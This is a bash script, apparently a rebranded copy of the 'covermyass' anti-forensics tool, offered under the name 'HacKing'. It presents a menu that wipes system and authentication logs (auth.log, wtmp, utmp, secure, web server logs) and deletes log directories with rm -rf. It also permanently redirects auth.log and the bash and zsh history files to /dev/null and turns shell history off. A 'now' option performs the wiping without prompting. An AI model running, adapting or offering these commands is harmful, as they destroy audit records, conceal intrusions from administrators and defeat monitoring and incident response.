#!/usr/bin/env bash
###############################################
#     _   _            _  ___                 #
#    | | | | __ _  ___| |/ (_)_ __   __ _     #
#    | |_| |/ _' |/ __| ' /| | '_ \ / _' |    #
#    |  _  | (_| | (__| . \| | | | | (_| |    #
#    |_| |_|\__,_|\___|_|\_\_|_| |_|\__, |    #
#                                   |___/     #
###############################################
#
# Source Name : Covermyass.sh
# Source: https://github.com/sundowndev/covermyass/master/covermyass
#
# New Name : HacKing
# New Date : 11 January 2022
# Description : Covermyass is a Cleaning Logs Tool and Disable/Enable auth manager.
#
# Created: 11/01/2022
# Aouther: Global Anlominus RhytMix 2022
# Skils: Best Copyrigter IN the COSMOS!
# BIG THANX TO ALL COMUNITY THAT SHARE ALL THAT FREE GREAT SCRIPTS
# CREDIT: ToAllWorldCreatorsHackingTools
# Location: Made With Love IN Israel
# Tool Name: HacKing
# Source: https://github.com/Anlominus/HacKing
#
################
#    VColors   #
################
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
purple="\033[0;35m"
cyan="\033[0;36m"
cafe="\033[0;33m"
fiuscha="\033[0;35m"
blue="\033[1;34m"
nc=""
###############
#    Banner   #
###############
function Banner(){
echo ""
echo ""
echo "$red       ###############################################"
echo "       #     _   _            _  ___                 #"
echo "       #    | | | | __ _  ___| |/ (_)_ __   __ _     #"
echo "       #    | |_| |/ _' |/ __| ' /| | '_ \ / _' |    #"
echo "       #    |  _  | (_| | (__| . \| | | | | (_| |    #"
echo "       #    |_| |_|\__,_|\___|_|\_\_|_| |_|\__, |    #"
echo "       #                                   |___/     #"
echo "$red       ###############################################"
echo "  $red[$green+$red]$cyan Github: https://www.github.com/Anlominus/HacKing $red[$green+$red]\n\n"

}

##################
#    ManBanner   #
##################
function ManBanner(){
echo "$purple
                           .
                       ..',,'..
                     .',,,,,,,,,.
                    .',,,'..',,,,'.
                   .',,'.     .,,,'
                  .',,.        .,,,.
                 .',..           .,,.
                 .'.              ..,.
                 .                  .'
                ..    $green Aภl๏miuภuຮ $purple   .
                ..                   .
                ..                  ...
         ....''''.     $blue HacKing$purple     .','''....
       .',,,,,,,,'..               ..',,,,,,,,'.
      ...'',,,,,,,'...          ....',,,,,,,,'...
     ....'',;;;;;;;,,'''......'''',,;;;;;;;,'''...
    ......'',,;;;:::cccllllooooooooooooollll:'.....
    .....'.'',,;;::ccloodxxxdddddddooooollll,.'....
    .......',,;;::clloddxkkkkxxxdddoooollllc,......
    .'''''',,;;::cclooooDATOS0000Oxoooollllc,.......
   ..'''',',;;::ccclllooodk0xdddddxdoollllcc,'''''...
  ........';;::ccclllooodddxkkkkkkxdollllcc:'.........
 ......  .':::ccllloooodddxxxddddoddolllcc::'..  ......
 ......:.;:::ccllloooodddxxxddddooooollcc::;'c,':......
  .''..cc.''''''',,,,,,,;;;;;,,,,,,,,''''....:.cc..''.
"
echo  "  $red[$green+$red]$cyan Github: https://www.github.com/Anlominus/HacKing $red[$green+$red]"
}

#################
#    VNumbers   #
#################
nx="x"
n00="00"
n1="1"
n2="2"
n3="3"
n4="4"
n5="5"
n6="6"
n7="7"
n8="8"
n9="9"
n10="10"
n11="11"
n13="13"
n14="14"
n15="15"
n16="16"
n17="17"
n18="18"

##################
#    VTCOLOR     #
##################
cInfo="$red[$yellow!$red]$white"
cPlus="$red[$green+$red]$white"
cx="$red[$green$nx$red]$white"
c1="$red[$green$n1$red]$white"
c2="$red[$green$n2$red]$white"
c3="$red[$green$n3$red]$white"
c4="$red[$green$n4$red]$white"
c5="$red[$green$n5$red]$white"
c6="$red[$green$n6$red]$white"
c7="$red[$green$n7$red]$white"
c8="$red[$green$n8$red]$white"
c9="$red[$green$n9$red]$white"
c10="$red[$green$n10$red]$white"
c11="$red[$green$n11$red]$white"

prompt="${purple}[${blue}Anlominus${cyan}@${blue}CoveMyAss${purple}]$"

LOGS_FILES=(
        /var/log/messages # General message and system related stuff
        /var/log/auth.log # Authenication logs
        /var/log/kern.log # Kernel logs
        /var/log/cron.log # Crond logs
        /var/log/maillog # Mail server logs
        /var/log/boot.log # System boot log
        /var/log/mysqld.log # MySQL database server log file
        /var/log/qmail # Qmail log directory
        /var/log/httpd # Apache access and error logs directory
        /var/log/lighttpd # Lighttpd access and error logs directory
        /var/log/secure # Authentication log
        /var/log/utmp # Login records file
        /var/log/wtmp # Login records file
        /var/log/yum.log # Yum command log file
        /var/log/system.log # System Log
        /var/log/DiagnosticMessages # Mac Analytics Data
        /Library/Logs # System Application Logs
        /Library/Logs/DiagnosticReports # System Reports
        ~/Library/Logs # User Application Logs
        ~/Library/Logs/DiagnosticReports # User Reports
)

function isRoot () {
        if [ "$EUID" -ne 0 ]; then
                return 1
        fi
}


function menu () {
        echo
        ManBanner
        echo
        echo "\t$red[$blue Cover My Ass $red]"
        echo
        echo "\t $c1 Clear logs for user $USER"
        echo "\t $c2 Permenently disable auth & bash history"
        echo "\t $c3 Restore settings to default"
        echo
        echo "\t $cx Exit tool"
        echo
        echo "  $prompt "
        read cmd
        case ${cmd} in
        1) # Clear logs & current history
          clearLogs
          sleep 5
          clearHistory
          sleep 5
          menu;;
        2) # Permenently disable auth & bash log
          disableAuth
          sleep 3
          disableHistory
          sleep 3
          menu;;
        3) # Restore default settings
          enableAuth
          sleep 3
          enableHistory
          sleep 3
          menu;;
        x|0|00|exit|Exit)
          echo "${green}Exiting ...."
          clear
          exit          ;;
        *)
        clear
        menu;;
      esac
}

function disableAuth () {
        if [ -w /var/log/auth.log ]; then
                ln /dev/null /var/log/auth.log -sf
                echo "\t $cPlus Permanently sending /var/log/auth.log to /dev/null"
        else
                echo "\t $cInfo /var/log/auth.log $yellow is not writable! $red Retry using sudo."
        fi
}

function disableHistory () {
        ln /dev/null ~/.bash_history -sf
        echo "\t $cPlus Permanently sending bash_history to /dev/null"

        if [ -f ~/.zsh_history ]; then
                ln /dev/null ~/.zsh_history -sf
                echo "\t $cPlus Permanently sending zsh_history to /dev/null"
        fi

        export HISTFILESIZE=0
        export HISTSIZE=0
        echo "\t $cPlus Set HISTFILESIZE & HISTSIZE to 0"

        set +o history
        echo "\t $cPlus Disabled history library"

        echo
        echo "Permenently disabled bash log."
}

function enableAuth () {
        if [ -w /var/log/auth.log ] && [ -L /var/log/auth.log ]; then
                rm -rf /var/log/auth.log
                echo "" > /var/log/auth.log
                echo "\t $cPlus Disabled sending auth logs to /dev/null"
        else
                echo "\t $cInfo /var/log/auth.log $yellow is not writable! $red Retry using sudo."
        fi
}

function enableHistory () {
        if [[ -L ~/.bash_history ]]; then
                rm -rf ~/.bash_history
                echo "" > ~/.bash_history
                echo "\t $cPlus Disabled sending history to /dev/null"
        fi

        if [[ -L ~/.zsh_history ]]; then
                rm -rf ~/.zsh_history
                echo "" > ~/.zsh_history
                echo "\t $cPlus Disabled sending zsh history to /dev/null"
        fi

        export HISTFILESIZE=""
        export HISTSIZE=50000
        echo "\t $cPlus Restore HISTFILESIZE & HISTSIZE default values."

        set -o history
        echo "\t $cPlus Enabled history library"

        echo
        echo "Permenently enabled bash log."
}

function clearLogs () {
        for i in "${cyan} ${LOGS_FILES[@]}"
        do
                if [ -f "$i" ]; then
                        if [ -w "$i" ]; then
                                echo "" > "$i"
                                echo "\t $cPlus $i $green Cleaned."
                        else
                                echo "\t $cInfo $i $yellow is not writable! $red $red Retry using sudo."
                        fi
                elif [ -d "$i" ]; then
                        if [ -w "$i" ]; then
                                rm -rf "${i:?}"/*
                                echo "\t $cPlus $i $green Cleaned."
                        else
                                echo "\t $cInfo $i $yellow is not writable! $red Retry using sudo."
                        fi
                fi
        done
}

function clearHistory () {
        if [ -f ~/.zsh_history ]; then
                echo "" > ~/.zsh_history
                echo "\t $cPlus ~/.zsh_history $green Cleaned."
        fi

        echo "" > ~/.bash_history
        echo "\t $cPlus ~/.bash_history $green Cleaned."

        history -c
        echo "\t $cPlus $cyan History file deleted."

        echo
        echo "$cInfo $yellow Reminder: $grey your need to reload the session to see effects."
        echo "$cInfo $cyan Type exit to do so."
}

function exitTool () {
        exit 1
}

clear # Clear output

# "now" option
if [ -n "$1" ] && [ "$1" == 'now' ]; then
        clearLogs
        clearHistory

fi
menu
